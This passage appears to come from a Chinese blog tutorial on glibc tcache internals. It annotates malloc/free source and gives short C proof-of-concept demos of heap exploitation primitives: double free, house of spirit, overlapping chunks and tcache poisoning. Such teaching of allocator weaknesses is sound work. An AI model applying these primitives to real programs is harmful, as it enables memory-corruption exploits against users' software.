<code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a 